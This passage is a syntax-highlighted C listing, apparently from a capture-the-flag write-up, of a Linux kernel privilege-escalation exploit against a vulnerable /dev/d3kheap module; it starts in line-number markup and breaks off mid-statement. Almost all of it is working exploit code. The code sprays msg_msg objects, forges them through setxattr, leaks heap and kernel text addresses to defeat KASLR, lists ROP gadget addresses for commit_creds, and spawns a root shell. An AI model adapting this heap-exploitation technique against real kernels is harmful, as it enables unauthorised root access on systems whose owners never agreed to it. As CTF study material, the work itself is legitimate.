class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY        040000  <span class="comment">/* copy (not remove) all queue messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernelLeakQuery</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff812b76e9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base_guess = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_offset, msg_offset_count;</span><br><span class="line">    <span class="type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;</span><br><span class="line">    <span class="type">int</span> kmsg_idx;</span><br><span class="line">    <span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_queue addr from heap</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_heap_leak = buf[i];</span><br><span class="line">            kmsg_idx = (<span class="type">int</span>)(((<span class="type">char</span>*)(&amp;buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">            <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_text_leak = buf[i];</span><br><span class="line">                kernel_base += kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_msg addr</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kmsg_addr = buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">/*puts(&quot;[*] leaking...&quot;);</span></span><br><span class="line"><span class="comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span></span><br><span class="line">    fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel text base if we didn&#x27;t leak it before</span></span><br><span class="line">    kernel_heap_search = kmsg_addr - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> leaking_times = <span class="number">0</span>; !kernel_text_leak; leaking_times++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">    </span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);</span><br><span class="line"></span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            kernel_heap_search += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_offset_count = <span class="number">0</span>;</span><br><span class="line">        msg_offset = <span class="number">0xdeadbeefbad4f00d</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">                kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_text_leak = buf[i];</span><br><span class="line">                    kernel_base += kernel_offset;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!buf[i])</span><br><span class="line">                msg_offset = msg_offset_count * <span class="number">8</span>;</span><br><span class="line">            msg_offset_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg_offset == <span class="number">0xdeadbeefbad4f00d</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to find next valid foothold!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        kernel_heap_search += msg_offset; <span class="comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">leak_out:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span 